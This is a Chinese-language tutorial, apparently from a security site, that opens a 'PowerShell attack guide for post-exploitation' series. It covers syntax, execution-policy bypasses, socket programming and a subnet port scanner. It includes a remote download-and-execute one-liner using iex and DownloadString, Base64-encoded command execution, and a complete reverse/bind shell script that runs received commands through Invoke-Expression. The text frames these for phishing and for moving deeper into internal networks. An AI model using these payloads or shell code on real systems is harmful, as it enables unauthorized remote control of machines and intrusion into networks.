# Powershell攻击指南黑客后渗透之道系列——基础篇

阅读量 **1256251**

|评论 **22**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-11-30 16:52:27

 **x**

##### 译文声明

本文是翻译文章，文章原作者 香山

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/dm/1024_616_/t01e48a758e6a9e47ee.png)

作者：[香山](https://www.anquanke.com/member/122354)

预估稿费：800RMB

**（本篇文章享受双倍稿费 活动链接请**[ **点击此处**](http://bobao.360.cn/news/detail/4370.html)
**）**

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**此为Powershell攻击指南——黑客后渗透之道系列的第一篇基础篇。此后每两天更新一篇，敬请期待！**

## 传送门

[Powershell攻击指南黑客后渗透之道系列——进阶利用](https://www.anquanke.com/post/id/88851)

[Powershell攻击指南黑客后渗透之道系列——实战篇](https://www.anquanke.com/post/id/89362)

# 前言

>
> 一段时间以来研究Powershell，后来应朋友们对Powershell的需求，让我写一个Powershell安全入门或者介绍方面的文章，所以这篇文章就出现了。但又因为各种各样的事情搞得有些拖延，同时作者文笔不好，文章可能有不流畅的地方，还请多多见谅。这里做一些总结，来让新人对此有个大致了解，能对Powershell或是内网有更多的理解。开始之前也要感谢红线安全团队的资深安全专家[@城哥](http://triplekill.org)和朋友[x403258](http://blog.exist1ng.com)在我写文过程中的帮助。

>
> 那么开始之前我们先来思考一下powershell一个常见的问题，那么我们知道powershell的后缀是ps1，哪为什么是ps1而不是ps2,ps3呢？那么理解这个问题呢我们可以看看powershell的特性，powershell是对下完全兼容的，也就是说你使用powershell
> 5.x的版本来执行powershell
> v1.0的代码也是完全没有问题的。那么我个人理解一下为什么是ps1，可以这么说，当我们见到ps2后缀之时就是powershell进行大的更新，也就是不对下兼容的时候，所以这里一直是使用ps1后缀。

>
> 那么对于我们的安全人员来说我们用什么版本呢？毫无疑问是v2,为什么呢，应为在win7当中默认安装了v2,而且之后的版本都是兼容v2的，v1版本所有的功能对于我们的需求很多都不能满足，所以v2成为了我们目前来说独一无二的选择，通过下面的方式我们可以看到我们的powershell的版本与一些详细的信息，后面我们的代码，大多都是以v2.0来讨论的。

`Get-Host`

    
    
    Name             : ConsoleHost
    Version          : 2.0
    InstanceId       : 388599a6-35cd-4bba-bedb-cf00d2a39389
    UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
    CurrentCulture   : zh-CN
    CurrentUICulture : en-US
    PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
    IsRunspacePushed : False
    Runspace         : System.Management.Automation.Runspaces.LocalRunspace

对于安全人员学习ps主要有以下两个场景：

  1. 第一种我们需要获得免杀或者更好的隐蔽攻击对方的win机器，可以通过钓鱼等方式直接执行命令

  2. 第二种我们已经到了对方网络，再不济也是一台DMZ的win-server，那么我们利用ps做的事情那么自然而然的是对内网继续深入

那么本powershell系列主要是内容涉及和安全测试相关的内容，所以面向的读者主要是安全或者运维人员，不管你是在网络世界中扮演什么角色，在这里应该是能收获到你想要的。文章主要包含下面一些内容:

  1. powershell基础语法

  2. powershell脚本编写与调用执行

  3. powershell的Socket编程

  4. powershell端口扫描与服务爆破

  5. powershell多线程

  6. powershell操作wmi

  7. powershell操作win32API

  8. powershell操作Dll注入&shellcode注入&exe注入

  9. powershell混淆

  10. powershell事件日志

  11. powershell实例使用场景

  12. Powershell渗透工具集

# powershell(2)-基础

>
> 本节主要讲一下关于powershell一些简单的基础知识，推荐网站<http://www.pstips.net/>学习Powershell的一些基础知识这里是一些简单的基础，写的可能有些简陋，这里可能需要你有一些编程语言的基础就能看懂啦，这里对于后面的代码分析是非常有用的，所以还是希望大家简单的浏览一下基础知识。

## 变量

变量都是以`$`开头, 是强类型语言, 语言是大小写不敏感的

提一提变量保护与常量的声明：`New-Variable num -Value 100 -Force -Option
readonly`这样就得到一个受保护的变量`$num`，如果要销毁它只能通过`del $num`删除。如果要声明常量则用`New-Variable num
-Value 100 -Force -Option readonlyNew-Variable num -Value 100 -Force -Option
constant`

## 数组

### 数组的创建：

数组的创建可以通过下面五种方式来创建，在适当的条件下选择适当的方式创建即可

    
    
    $array = 1,2,3,4
    $array = 1..4
    $array=1,"2017",([System.Guid]::NewGuid()),(get-date)
    $a=@()  # 空数组
    $a=,"1" # 一个元素的数组

### 数组的访问

数组的访问和C类似，第一位元素实用下标0来访问即`$array[0]`,我们来看看ipconfig获取到的数据

    
    
    $ip = ipconfig
    $ip[1] # 获取ipconfig第二行的数据

### 数组的判断

`$test -is [array]`

### 数组的追加:

`$books += "元素4"`

## 哈希表

### 哈希表的创建：

`$stu=@{ Name = "test";Age="12";sex="man" }`

### 哈希表里存数组：

`$stu=@{ Name = "hei";Age="12";sex="man";Books="kali","sqlmap","powershell" }`

### 哈希表的插入与删除:

    
    
    $Student=@{}
    $Student.Name="hahaha"
    $stu.Remove("Name")

## 对象

在powershell中一切都可以视为对象，包罗万象New-Object可以创建一个对象Add-Member可以添加属性和方法

## 控制语句

### 条件判断

#### 比较运算符

    
    
    -eq ：等于
    -ne ：不等于
    -gt ：大于
    -ge ：大于等于
    -lt ：小于
    -le ：小于等于
    -contains ：包含
    $array -contains something
    ​
    -notcontains :不包含
    !($a): 求反
    -and ：和
    -or ：或
    -xor ：异或
    -not ：逆

#### if-else

    
    
    if-else:
    ​
    if($value -eq 1){
        code1
    }else{
        code2
    }

### 循环语句

#### while

    
    
    while($n -gt 0){
        code
    }

#### for

    
    
    $sum=0
    for($i=1;$i -le 100;$i++)
    {
        $sum+=$i
    }
    $sum

#### foreach

    
    
    # 打印出windows目录下大于1mb的文件名
    foreach($file in dir c:windows)
    {
        if($file.Length -gt 1mb)
        {
            $File.Name
        }
    }

#### foreach-object

    
    
    # 获取所有的服务，并获取对呀进程ID是否大于100
    Get-WmiObject Win32_Service | ForEach-Object {"Name:"+ $_.DisplayName, ", Is ProcessId more than 100:" + ($_.ProcessId -gt 100)}

## 函数

    
    
    function Invoke-PortScan {
    <#
    .SYNOPSIS 
    简介
    ​
    .DESCRIPTION
    描述
        
    .PARAMETER StartAddress
    参数
    ​
    .PARAMETER EndAddress
    参数
    ​
    .EXAMPLE
    PS > Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254
    用例
    #>
    code
    }

## 异常处理

    
    
    Try{
        $connection.open()
        $success = $true
    }Catch{
        $success = $false
    }

# Powershell(3)-脚本执行基础

## 开始之前

我们在开始之前先来介绍在windows平台中常用到的几种脚本

### Bat

这就是我们常用的Bat脚本，全名为批处理文件，脚本中就是我们在CMD中使用到的命令，这里提一个小问题：CMD的命令行执行命令的优先级是`.bat >
.exe`，那么假如我放一个cmd.bat在system32目录下，那么优先执行的是cmd.bat，这里面的内容就变得不可描述起来了

### VBscript

执行vbs就是常说的vbscript,是微软为了方便自动化管理windows而推出的脚本语言，这里了解一下即可，不是文章重点。

    
    
    一个小例子通过vbs操作WMI
    Set wmi = GetObject("winmgmts:")
    Set collection = wmi.ExecQuery("select * from Win32_Process")
    For Each process in collection
    WScript.Echo process.getObjectText_
    Next

## Powershell

这就是我们的主角，在现在和未来一定是powershell占据主要地位(对于这一点搞Win多一点的朋友一定不会怀疑)，首先我们来看一个简单的例子

    
    
    script.ps1:
    # 脚本内容
    function test-conn { Test-Connection  -Count 2 -ComputerName $args}
    ​
    # 载入脚本文件
    .script.ps1
    ​
    # 调用函数
    test-conn localhost

### Powershell执行策略

那么你可能会在调用脚本的时候出现报错，这是powershell的安全执行策略，下面我们来了解一下执行策略：PowerShell 提供了
Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass、Undefined
六种类型的执行策略简单介绍各种策略如下：

名称 | 说明  
---|---  
Restricted | 受限制的，可以执行单个的命令，但是不能执行脚本Windows 8, Windows Server 2012, and
Windows 8.1中默认就是这种策略，所以是不能执行脚本的，执行就会报错，那么如何才能执行呢？Set-ExecutionPolicy
-ExecutionPolicy Bypass就是设置策略为Bypass这样就可以执行脚本了。  
AllSigned | AllSigned 执行策略允许执行所有具有数字签名的脚本  
RemoteSigned |
当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。  
Unrestricted | 这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。需要你确认是否执行脚本  
Bypass | Bypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。  
Undefined | Undefined 表示没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略。  
  
那么我们如何绕过这些安全策略呢？下面提供几种方法，网上还有很多的绕过方法，大家可以自行研究：

名称 | 说明  
---|---  
Get-ExecutionPolicy | 获取当前的执行策略  
Get-Content .test.ps1 | powershell.exe -noprofile – | 通过管道输入进ps  
powershell -nop -c “iex(New-Object
Net.WebClient).DownloadString(‘<http://192.168.1.2/test.ps1>‘)” |
通过远程下载脚本来绕过|​bytes = [System.Text.Encoding]::Unicode.GetBytes(​encodedCommand
=[Convert]::ToBase64String(​encodedCommand|通过BASE64编码执行|  
  
### powershell的脚本调用方法：

  1. 如果脚本是直接写的代码而不是只定义了函数那么直接执行脚本.script.ps1即可

  2. 但是如果是载入里面的函数需要`.+空格+.script.ps1`

  3. 或者使用Import-Module .script.ps1, 这样才能直接使用脚本的函数

## 通过控制台执行Powershell

对于我们安全测试人员通常获取到的一个Shell是CMD的, 那么我们想要尽可能少的操作就可以直接通过控制台来执行powershell的命令,
那么先来看一个简单的例子:

![](https://p4.ssl.qhimg.com/t0118dde9c4c3288aa4.png)

可以看到我们通过CMD界面执行了Powershell的代码, 那么其实这样的执行方式在真实的安全测试环境中利用更多,
下面是一个Powershell通过这种方式执行的所有可选的参数:

    
    
    PowerShell[.exe]
           [-PSConsoleFile <file> | -Version <version>]
           [-EncodedCommand <Base64EncodedCommand>]
           [-ExecutionPolicy <ExecutionPolicy>]
           [-File <filePath> <args>]
           [-InputFormat {Text | XML}] 
           [-NoExit]
           [-NoLogo]
           [-NonInteractive] 
           [-NoProfile] 
           [-OutputFormat {Text | XML}] 
           [-Sta]
           [-WindowStyle <style>]
           [-Command { - | <script-block> [-args <arg-array>]
                         | <string> [<CommandParameters>] } ]
    ​
    PowerShell[.exe] -Help | -? | /?

名称 | 解释  
---|---  
-Command | 需要执行的代码  
-ExecutionPolicy | 设置默认的执行策略，一般使用Bypass  
-EncodedCommand | 执行Base64代码  
-File | 这是需要执行的脚本名  
-NoExit | 执行完成命令之后不会立即退出，比如我们执行powerhsell whoami 执行完成之后会推出我们的PS会话，如果我们加上这个参数，运行完之后还是会继续停留在PS的界面  
-NoLogo | 不输出PS的Banner信息  
-Noninteractive | 不开启交互式的会话  
-NoProfile | 不使用当前用户使用的配置文件  
-Sta | 以单线程模式启动ps  
-Version | 设置用什么版本去执行代码  
-WindowStyle | 设置Powershell的执行窗口，有下面的参数Normal, Minimized, Maximized, or Hidden  
  
最后举一个执行Base64代码的例子:

  1. 我们先试用上面一个表格提到的编码代码编码命令`whoami`, 得到字符串:`dwBoAG8AYQBtAGkACgA=`

  2. 通过下面的命令来执行代码

    
    
    powershell -EncodedCommand dwBoAG8AYQBtAGkACgA=

![](https://p4.ssl.qhimg.com/t01693e32e6295eaf13.png)

那么这种需求在什么地方呢? 比如我们的代码特别长或者会引起一起歧义的时候就需要我们使用这种方式去执行, 同时也是一个混淆的方式。

# Powershell(4)-Socket网络编程

>
> 这一小节我们介绍Powershell中的Socket编程，网络编程是所有语言中绕不开的核心点，下面我们通过对代码的分析来让大家对PS中的Socket有一个初步的了解。

## Socket-Tcp编程

开始之前我们先想想为什么要学习socket编程，那么最直观的是端口扫描，那么还有可能是反弹shell之类的应用。进行Socket编程只需要调用.Net框架即可，这里先使用TCP来示例:

这里是去打开一个TCP连接到本地的21端口，并获取21端口返回的Banner信息，其中GetOutput函数看不了可以先不看,其用来获取stream中的数据，主要看Main函数内容：

    
    
    Tcp-Demo.ps1
    function GetOutput 
    { 
        ## 创建一个缓冲区获取数据
        $buffer = new-object System.Byte[] 1024 
        $encoding = new-object System.Text.AsciiEncoding 
    ​
        $outputBuffer = "" 
        $findMore = $false 
    ​
        ## 从stream读取所有的数据，写到输出缓冲区
        do{ 
            start-sleep -m 1000 
            $findmore = $false 
            # 读取Timeout
            $stream.ReadTimeout = 1000 
    ​
            do{ 
                try { 
                    $read = $stream.Read($buffer, 0, 1024) 
                    if($read -gt 0){ 
                        $findmore = $true 
                        $outputBuffer += ($encoding.GetString($buffer, 0, $read)) 
                    } 
                } catch { $findMore = $false; $read = 0 } 
            } while($read -gt 0) 
        } while($findmore) 
    ​
        $outputBuffer 
    }
    ​
    function Main{
        # 定义主机和端口
        $remoteHost = "127.0.0.1"
        $port = 21
        # 定义连接Host与Port
        $socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port) 
        # 进行连接
        $stream = $socket.GetStream()
        # 获取Stream
        $writer = new-object System.IO.StreamWriter $stream 
        # 创建IO对象
        $SCRIPT:output += GetOutput 
        # 声明变量
        if($output){ 
            # 输出
            foreach($line in $output.Split("`n")) 
            {
                write-host $line 
            }
            $SCRIPT:output = "" 
        }
    }
    . Main

我们来看看输出结果：

    
    
    PS C:UsersrootclayDesktoppowershell> . .Tcp-Demo.ps1
    220 Microsoft FTP Service

这样就打开了21端口的连接，并且获取到了21端口的banner信息。那么有过端口扫描编写的朋友肯定已经看到了，这种方式是直接打开连接，并不能获取到一些需要发包才能返回banner的端口信息，典型的80端口就是如此，我们需要给80端口发送特定的信息才能得到Response,
当然还有许多类似的端口，比如3389端口, 下面我们来看看我们如何使用powershell实现这项功能.

    
    
    Tcp-Demo2.ps1
    function GetOutput 
    { 
        ... # 代码和上面的一样
    }
    ​
    function Main{
        # 定义主机和端口
        $remoteHost = "127.0.0.1"
        $port = 80
        # 定义连接Host与Port
        $socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port) 
        # 进行连接
        $stream = $socket.GetStream()
        # 获取Stream
        $writer = new-object System.IO.StreamWriter $stream 
        # 创建IO对象
        $SCRIPT:output += GetOutput 
        # 声明变量, userInput为要发包的内容,这里我们需要发送一个GET请求给Server
        $userInput = "GET / HTTP/1.1 `nHost: localhost  `n`n"
        # 定义发包内容
        foreach($line in $userInput) 
            { 
                # 发送数据
                $writer.WriteLine($line) 
                $writer.Flush() 
                $SCRIPT:output += GetOutput 
            } 
        
        if($output){ 
            # 输出
            foreach($line in $output.Split("`n")) 
            {
                write-host $line 
            }
            $SCRIPT:output = "" 
        }
    }
    . Main

我们来看看输出:

    
    
    PS C:UsersrootclayDesktoppowershell> . .Tcp-Demo2.ps1
    HTTP/1.1 200 OK
    Content-Type: text/html
    Accept-Ranges: bytes
    ETag: "5e26ec16b73ad31:0"
    Server: Microsoft-IIS/7.5
    Content-Length: 689
    ​
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <title>IIS7</title>
    <style type="text/css">
    </style>
    </head>
    <body>
    ...
    </body>
    </html>

我们下面对这项功能进行一个整合：我们可以发包给一个端口，也可以直接连接一个端口，这里已经实现TCP，http，https三种常见协议的访问

    
    
    ########################################
    ## Tcp-Request.ps1 
    ## 
    ## Example1: 
    ## 
    ## $http = @" 
    ## GET / HTTP/1.1 
    ## Host:127.0.0.1 
    ## `n`n 
    ## "@ 
    ## 
    ## `n 在Powershell中代表换行符
    ## $http | .Tcp-Request localhost  80 
    ## 
    ## Example2: 
    ## .Tcp-Request localhost 80  
    ######################################## 
    ​
    ## 管理参数输入param()数组
    param( 
            [string] $remoteHost = "localhost", 
            [int] $port = 80, 
            [switch] $UseSSL, 
            [string] $inputObject, 
            [int] $commandDelay = 100 
         ) 
    ​
    [string] $output = "" 
    ​
    ## 获取用户输入模式
    $currentInput = $inputObject 
    if(-not $currentInput) 
    { 
        $SCRIPT:currentInput = @($input) 
    } 
    # 脚本模式开关, 如果脚本能读取到输入, 使用发包模式, 如果没有输入使用TCP直连模式
    $scriptedMode = [bool] $currentInput 
    ​
    function Main
    { 
        ## 打开socket连接远程机器和端口
        if(-not $scriptedMode) 
        { 
            write-host "Connecting to $remoteHost on port $port" 
        } 
        ## 异常追踪
        trap { Write-Error "Could not connect to remote computer: $_"; exit } 
        $socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port) 
    ​
        if(-not $scriptedMode) 
        { 
            write-host "Connected. Press ^D(Control + D) followed by [ENTER] to exit.`n" 
        } 
    ​
        $stream = $socket.GetStream() 
    ​
        ## 如果有SSl使用SSLStream获取Stream
        if($UseSSL) 
        { 
            $sslStream = New-Object System.Net.Security.SslStream $stream,$false 
            $sslStream.AuthenticateAsClient($remoteHost) 
            $stream = $sslStream 
        } 
    ​
        $writer = new-object System.IO.StreamWriter $stream 
    ​
        while($true) 
        { 
            ## 获取得到的Response结果
            $SCRIPT:output += GetOutput 
    ​
            
            ## 如果我们使用了管道输入的模式，我们发送我们的命令，再接受输出，并退出
            if($scriptedMode) 
            { 
                foreach($line in $currentInput) 
                { 
                    $writer.WriteLine($line) 
                    $writer.Flush() 
                    Start-Sleep -m $commandDelay 
                    $SCRIPT:output += GetOutput 
                } 
    ​
                break 
            } 
            ## 如果没有使用事先管道输入的模式直接读取TCP回包
            else 
            { 
                if($output)  
                { 
                    # 逐行输出
                    foreach($line in $output.Split("`n")) 
                    { 
                        write-host $line 
                    } 
                    $SCRIPT:output = "" 
                } 
    ​
                ## 获取用户的输入,如果读取到^D就退出 
                $command = read-host 
                if($command -eq ([char] 4)) { break; } 
    ​
                $writer.WriteLine($command) 
                $writer.Flush() 
            } 
        } 
    ​
        ## Close the streams 
        $writer.Close() 
        $stream.Close() 
    ​
        ## 如果我们使用了管道输入的模式,这里输出刚才读取到服务器返回的数据
        if($scriptedMode) 
        { 
            $output 
        } 
    } 
    ​
    ## 获取远程服务器的返回数据
    function GetOutput 
    { 
        ## 创建一个缓冲区获取数据
        $buffer = new-object System.Byte[] 1024 
        $encoding = new-object System.Text.AsciiEncoding 
        $outputBuffer = "" 
        $findMore = $false 
    ​
        ## 从stream读取所有的数据，写到输出缓冲区
        do 
        { 
            start-sleep -m 1000 
            $findmore = $false 
            $stream.ReadTimeout = 1000 
    ​
            do 
            { 
                try 
                { 
                    $read = $stream.Read($buffer, 0, 1024) 
    ​
                    if($read -gt 0) 
                    { 
                        $findmore = $true 
                        $outputBuffer += ($encoding.GetString($buffer, 0, $read)) 
                    } 
                } catch { $findMore = $false; $read = 0 } 
            } while($read -gt 0) 
        } while($findmore) 
    ​
        $outputBuffer 
    } 
    . Main 

那么至此我们已经完成了对TCP端口的打开并获取对应的信息，其中很多的关键代码释义我已经详细给出，我们主要以TCP为例，由于UDP应用场景相对于TCP较少，关于UDP的编写可自行编写。这个脚本加以修改就是一个Powershell完成的扫描器了，端口扫描器我们放在下一节来分析，我们这里最后看一个反弹shell的ps脚本,
同样在注释中详细解释了代码块的作用。

    
    
    function TcpShell{ 
    <#
    ​
    .DESCRIPTION
    一个简单的Shell连接工具, 支持正向与反向
    ​
    .PARAMETER IPAddress
    Ip地址参数
    ​
    .PARAMETER Port
    port参数
    ​
    .EXAMPLE
    反向连接模式
    PS > TcpShell -Reverse -IPAddress 192.168.254.226 -Port 4444
    ​
    .EXAMPLE
    正向连接模式
    PS > TcpShell -Bind -Port 4444
    ​
    .EXAMPLE
    IPV6地址连接
    PS > TcpShell -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
    #>  
        # 参数绑定
        [CmdletBinding(DefaultParameterSetName="reverse")] Param(
    ​
            [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
            [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
            [String]
            $IPAddress,
    ​
            [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
            [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
            [Int]
            $Port,
    ​
            [Parameter(ParameterSetName="reverse")]
            [Switch]
            $Reverse,
    ​
            [Parameter(ParameterSetName="bind")]
            [Switch]
            $Bind
    ​
        )
    ​
        
        try 
        {
            # 如果检测到Reverse参数,开启反向连接模式
            if ($Reverse)
            {
                $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
            }
    ​
            # 使用正向的连接方式, 绑定本地端口, 用于正向连接
            if ($Bind)
            {
                # Tcp连接监听服务端
                $server = [System.Net.Sockets.TcpListener]$Port
                # Tcp连接开始
                $server.start()    
                # Tcp开始接受连接
                $client = $server.AcceptTcpClient()
            } 
    ​
            $stream = $client.GetStream()
            [byte[]]$bytes = 0..65535|%{0}
    ​
            # 返回给连接的用户一个简单的介绍,目前是使用什么的用户来运行powershell的, 并打印powershell的banner信息
            $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + 
    ​
    "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
            $stream.Write($sendbytes,0,$sendbytes.Length)
    ​
            # 展示一个交互式的powershell界面
            $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
            $stream.Write($sendbytes,0,$sendbytes.Length)
    ​
            # while循环用于死循环,不断开连接
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
            {
                # 指定EncodedText为Ascii对象, 用于我们后面的调用来编码
                $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                # 获取用户的输入
                $data = $EncodedText.GetString($bytes,0, $i)
                try
                {
                    # 调用Invoke-Expression来执行我们获取到的命令, 并打印获得的结果
                    # Invoke-Expression会把所有的传入命令当作ps代码执行
                    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
                }
                catch
                {
                    # 错误追踪
                    Write-Warning "Execution of command error." 
                    Write-Error $_
                }
                $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
                # 错误打印
                $x = ($error[0] | Out-String)
                $error.clear()
                $sendback2 = $sendback2 + $x
    ​
                # 返回结果
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()  
            }
            # 关闭连接
            $client.Close()
            if ($server)
            {
                $server.Stop()
            }
        }
        catch
        {
            # 获取错误信息,并打印
            Write-Warning "Something went wrong!." 
            Write-Error $_
        }
    }

简单的分析在注释已经提到, 其中`Invoke-Expression -Command`后接的代码都会被看作powershell来执行,
我们来看看正向连接的执行效果, 我们在172.16.50.196机器上执行下面的代码

    
    
    PS C:Usersrootclay> cd .Desktoppowershell
    PS C:UsersrootclayDesktoppowershell> . .Tcp-Shell.ps1
    PS C:UsersrootclayDesktoppowershell> TcpShell -bind -port 4444

连接这台机器, 结果如下:

![](https://p3.ssl.qhimg.com/t0104dbbf6261324626.png)

反向类似执行即可

大家可以看到这个脚本的最开始有一大块注释，这些注释无疑是增强脚本可读性的关键，对于一个脚本的功能和用法都有清晰的讲解，那么我们来看看如何写这些注释呢。

    
    
    <#
    ​
    .DESCRIPTION
    描述区域，主要写你脚本的一些描述、简介等
    ​
    .PARAMETER IPAddress
    参数介绍区域，你可以描述你的脚本参数的详情
    ​
    .EXAMPLE
    用例描述区域, 对于你的脚本的用例用法之类都可以在这里描述
    ​
    反向连接模式
    PS > TcpShell -Reverse -IPAddress 192.168.254.226 -Port 4444
    ​
    #>  

最后我们使用Get-Help命令就能看到我们编辑的这些注释内容：

![](https://p4.ssl.qhimg.com/t01c495b4f16c7d5907.png)

# powershell(5)-端口扫描与服务爆破

## 端口扫描

这里我们就开始了我们的端口扫描器的构建, 这里很多朋友肯定会说,
端口扫描不是有很多已经很成熟的脚本了么为什么还要去学习呢？那么我们首先想一想目前的一些优秀的端口扫描都是Python或者Go语言等进行编写的,
对于我们安全测试人员来说并不是最佳选择。因为对于Windows系统Python之类的环境并不是每一台电脑都有,
但Powershell不同我们不需要进行过多的操作即可进行丰富的操作, 这也是我们作为专业安全人员的基本素养: 尽可能进行少的操作,
因为你无法删除你所有的行踪, 物质守恒定律—没有人能确保自己不留任何痕迹, 那么越少的操作无疑是我们需要思考的。 端口扫描脚本已经直接放在了下面,
同样大部分的注释等已经写的很清晰, 本脚本涉及到的几个点：

  1. 脚本参数的问题的解决, 可以看到我们的参数获取用了CmdletBinding的方法，这样我们可以设置参数的形式就有很多了, 比如我们需要一个参数是否可选，和参数的位置等

  2. 主机存活检测使用Ping来检测(ICMP)

  3. 端口扫描调用.NET的Socket来进行端口连接，如果连接建立代表端口连接成功

    
    
    function PortScan {
    <#
    .DESCRIPTION
    端口扫描
    ​
    .PARAMETER StartAddress
    Ip开始地址 Range
    ​
    .PARAMETER EndAddress
    Ip结束地址 Range
    ​
    .PARAMETER GetHost
    解析获取主机名 HostName
    ​
    .PARAMETER ScanPort
    端口扫描参数, 若不打开就是主机存活的探测 PortScan
    ​
    .PARAMETER Ports
    需要扫描的端口，默认有: 21,22,23,25,53,80,110,139,143,389,443,445,465,873,993,995,1080,1086,
        1723,1433,1521,2375,3128,3306,3389,3690,5432,5800,5900,6379,7001,7002,7778,8000,8001,
        8080,8081,8089,8161,8888,9000,9001,9060,9200,9300,9080,9090,9999,10051,11211,27017,28017,50030
    ​
    .PARAMETER TimeOut
    TimeOut 默认是10s TimeOut 100
    ​
    .EXAMPLE
    PS > PortScan -StartAddress 172.16.50.1 -EndAddress 172.16.50.254
    ​
    .EXAMPLE
    PS > PortScan -StartAddress 172.16.50.1 -EndAddress 172.16.50.254 -GetHost
    ​
    .EXAMPLE
    PS > PortScan -StartAddress 172.16.50.1 -EndAddress 172.16.50.254 -GetHost -ScanPort
    ​
    .EXAMPLE
    PS > PortScan -StartAddress 172.16.50.1 -EndAddress 172.16.50.254 -GetHost -ScanPort -TimeOut 500
    ​
    .EXAMPLE
    PS > PortScan -StartAddress 172.16.50.1 -EndAddress 172.16.50.254 -GetHost -ScanPort -Port 80
    ​
    #>
        [CmdletBinding()] Param(
            [parameter(Mandatory = $true, Position = 0)]
            [ValidatePattern("bd{1,3}.d{1,3}.d{1,3}.d{1,3}b")]
            [string]
            $StartAddress,
    ​
            [parameter(Mandatory = $true, Position = 1)]
            [ValidatePattern("bd{1,3}.d{1,3}.d{1,3}.d{1,3}b")]
            [string]
            $EndAddress,
            
            [switch]
            $GetHost,
    ​
            [switch]
            $ScanPort,
    ​
            [int[]]
            $Ports = @
    ​
    (21,22,23,25,53,80,110,139,143,389,443,445,465,873,993,995,1080,1086,1723,1433,1521,2375,3128,3306,3389,3690,5432,5800,5900,6379,7001,7002,7778
    ​
    ,8000,8001,8080,8081,8089,8161,8888,9000,9001,9060,9200,9300,9080,9090,9999,10051,11211,27017,28017,50030),
            
            [int]
            $TimeOut = 100
        )  
        Begin {
            # 开始之前先调用Ping组件
            $ping = New-Object System.Net.Networkinformation.Ping
        }
        Process {
            # 四层循环获取解析IP地址
            foreach($a in ($StartAddress.Split(".")[0]..$EndAddress.Split(".")[0])) {
                foreach($b in ($StartAddress.Split(".")[1]..$EndAddress.Split(".")[1])) {
                foreach($c in ($StartAddress.Split(".")[2]..$EndAddress.Split(".")[2])) {
                    foreach($d in ($StartAddress.Split(".")[3]..$EndAddress.Split(".")[3])) {
                        # write-progress用于在shell界面显示一个进度条
                        write-progress -activity PingSweep -status "$a.$b.$c.$d" -percentcomplete (($d/($EndAddress.Split(".")[3])) * 100)
                        # 通过Ping命令发送ICMP包探测主机是否存活
                        $pingStatus = $ping.Send("$a.$b.$c.$d",$TimeOut)
                        if($pingStatus.Status -eq "Success") {
                            if($GetHost) {
                                # 本分支主要解决主机名的问题
                                # write-progress用于在shell界面显示一个进度条
                                write-progress -activity GetHost -status "$a.$b.$c.$d" -percentcomplete (($d/($EndAddress.Split(".")[3])) * 100) -    ​
    Id 1
                                # 获取主机名
                                $getHostEntry = [Net.DNS]::BeginGetHostEntry($pingStatus.Address, $null, $null)
                            }
                            if($ScanPort) {
                                # 定义一个开放的端口数组, 存储开放的端口
                                $openPorts = @()
                                for($i = 1; $i -le $ports.Count;$i++) {
                                    $port = $Ports[($i-1)]
                                    # write-progress用于在shell界面显示一个进度条
                                    write-progress -activity PortScan -status "$a.$b.$c.$d" -percentcomplete (($i/($Ports.Count)) * 100) -Id 2
                                    # 定义一个Tcp的客户端
                                    $client = New-Object System.Net.Sockets.TcpClient
                                    # 开始连接
                                    $beginConnect = $client.BeginConnect($pingStatus.Address,$port,$null,$null)
                                    if($client.Connected) {
                                        # 加入开放的端口
                                        $openPorts += $port
                                    } else {
                                    # 等待, 这里用于网络延迟, 防止因为网络原因而没有判断到端口的开放而错失很多机会
                                        Start-Sleep -Milli $TimeOut
                                        if($client.Connected) {
                                            $openPorts += $port
                                        }
                                    }
                                    $client.Close()
                                }
                            }
                            if($GetHost) {
                                # 获取主机名
                                $hostName = ([Net.DNS]::EndGetHostEntry([IAsyncResult]$getHostEntry)).HostName
                            }
                            # 返回对象-哈希表
                            New-Object PSObject -Property @{
                            IPAddress = "$a.$b.$c.$d";
                            HostName = $hostName;
                            Ports = $openPorts
                            } | Select-Object IPAddress, HostName, Ports
                        }
                    }
                }
                }
            }
        }
        End {
            # 其他脚本运行结束代码
        }
    }

我们开看看一个简单的扫描结果:

![](https://p0.ssl.qhimg.com/t01c9e7016193a011f4.png)

那么其他扫描模式可自行测试, 可以看到这种扫描是知识单线程模式, 关于多线程的编程我们放在后面再来研究。

## 服务爆破

